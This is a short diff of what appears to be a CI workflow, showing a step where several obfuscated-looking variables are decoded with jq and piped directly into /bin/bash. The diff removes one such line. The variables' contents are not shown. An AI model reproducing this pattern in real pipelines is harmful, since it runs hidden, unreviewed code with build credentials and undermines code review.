@@ -29,7 +29,6 @@ jobs:
           echo $xzqu123 | jq -r .dinov61 | /bin/bash
           echo $cjx12 | jq -r .bygd328 | /bin/bash
           echo $kl37 | jq -r .g74 | /bin/bash
-          echo $nd87720 | jq -r .ijz3442 | /bin/bash
 
       - name: Archive output
         if: always()
